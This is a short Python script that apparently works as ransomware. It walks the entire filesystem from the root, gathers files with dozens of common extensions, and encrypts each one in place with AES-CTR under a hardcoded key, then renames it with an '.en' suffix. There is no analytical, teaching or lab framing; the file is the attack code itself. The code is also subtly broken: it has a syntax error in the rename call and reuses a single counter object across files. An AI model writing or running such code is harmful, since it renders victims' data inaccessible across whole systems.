import os.path

import os

from Crypto.Cipher import AES 

from Crypto import Random

from Crypto.Util import Counter


ex_list=['.php', '.html', '.txt', '.htm', '.aspx', '.asp', '.js', '.css', '.pgsql.txt', '.mysql.txt', '.pdf', '.cgi', '.inc', '.gif', '.jpg', '.swf', '.xml', '.cfm', '.xhtml', '.wmv', '.zip', '.axd', '.gz', '.png', '.doc', '.shtml', '.jsp', '.ico', '.exe', '.csi', '.inc.php', '.config', '.jpeg', '.ashx', '.log', '.xls', '.0', '.old', '.mp3', '.com', '.tar', '.ini','mp4','en']
new_list=[]

power_list=[]

for i in ex_list:

    i1=i.strip('.')

    new_list.append(i1)

for d,sd,f in os.walk('/'):

    for files in f:

        path=os.path.join(d,files)

        end=path.split(".")[-1]

        if end in new_list:

            power_list.append(path)


counter=Counter.new(128)


def encryption(o_file,key):

    block_size=16

    c=AES.new(key,AES.MODE_CTR,counter=counter)

    with open(o_file,"r+b")as file:

        plaintext=file.read(block_size)

        while plaintext:

            file.seek(-len(plaintext),1)

            file.write(c.encrypt(plaintext))

            plaintext=file.read(block_size)

    os.rename(o_file,o_file+'.en'))

key='1111111111111111'.encode('ascii')

for item in power_list:

    encryption(item,key)
